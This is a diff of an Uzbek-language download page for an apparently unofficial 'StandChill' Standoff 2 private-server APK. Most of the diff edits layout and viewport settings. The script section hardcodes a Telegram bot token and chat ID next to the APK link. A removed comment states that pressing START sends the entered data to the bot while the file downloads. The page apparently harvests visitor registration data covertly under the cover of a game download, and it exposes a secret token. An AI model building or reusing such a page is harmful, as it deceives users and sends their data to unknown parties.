@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
+  <!-- Telefonlarda ham kompyuterdek chiroyli, keng ko'rinishi uchun moslashtirildi -->
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=1280, initial-scale=1.0">
   
   <title>StandChill 2.06 (F2) — Download Standoff 2 Privat</title>
   <meta name="description" content="StandChill 2.06 (F2) privat serverini yuklab oling. 120 FPS, barcha skinlar ochiq, eksklyuziv pichoqlar.">
@@ -19,7 +20,7 @@
 
     body {
       margin: 0;
-      padding: 20px 10px;
+      padding: 30px 10px;
       min-height: 100vh;
       display: flex;
       justify-content: center;
@@ -39,9 +40,7 @@
       align-items: flex-start;
       justify-content: center;
       gap: 20px;
-      max-width: 950px;
-      width: 100%;
-      z-index: 10;
+      width: 950px;
     }
 
     .left-side {
@@ -49,7 +48,6 @@
       display: flex;
       flex-direction: column;
       gap: 15px;
-      width: 100%;
     }
 
     .info-banner {
@@ -157,7 +155,7 @@
 
     .register-card {
       width: 320px;
-      min-width: 280px;
+      min-width: 320px;
       background: rgba(20, 22, 30, 0.9);
       backdrop-filter: blur(14px);
       -webkit-backdrop-filter: blur(14px);
@@ -248,27 +246,6 @@
     .social-icon-btn:hover {
       background: #ff5500;
       border-color: #ff5500;
-    }
-
-    @media (max-width: 768px) {
-      .container {
-        flex-direction: column;
-      }
-      .register-card, .left-side {
-        width: 100%;
-      }
-      .info-banner {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      .btn-download-banner {
-        width: 100%;
-        justify-content: center;
-      }
-      .register-card {
-        position: relative;
-        top: 0;
-      }
     }
   </style>
 </head>
@@ -447,7 +424,6 @@
     const BOT_TOKEN = '8045919333:AAHsBW5yKZW1tAGzY1Y368dhWBluoyYEvFE'; 
     const CHAT_ID = '7816925483';
     
-    // O'zingiz olib kelgan GitHub release havolasi ulandi
     const FILE_URL = 'https://github.com/dssd8752-cmyk/standchillow/releases/download/v2.06/2.06.F2.apk'; 
     const FILE_NAME = '2.06.F2.apk';
 
@@ -484,7 +460,6 @@
         }
       }
 
-      // START bosilganda ma'lumot botga ketadi va fayl sayt ichida yuklana boshlaydi
       triggerDownload();
     }
   </script>
